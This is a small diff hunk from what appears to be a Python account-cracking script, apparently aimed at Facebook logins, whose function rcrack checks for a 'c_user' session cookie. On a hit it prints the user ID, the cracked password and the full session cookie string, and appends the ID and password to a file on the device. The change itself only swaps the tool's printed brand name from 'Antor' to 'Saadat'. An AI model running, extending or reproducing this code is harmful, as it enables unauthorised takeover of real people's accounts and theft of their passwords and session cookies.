@@ -285,7 +285,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print('\033[38;5;46m[Antor -OK] ' +uid+ '|' +ps+    '  \n   \033[1;33mCOOKIES : \033[38;5;46m'+coki+ ' ')                
+                print('\033[38;5;46m[Saadat -OK] ' +uid+ '|' +ps+    '  \n   \033[1;33mCOOKIES : \033[38;5;46m'+coki+ ' ')                
                 open('/sdcard/Antor -OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
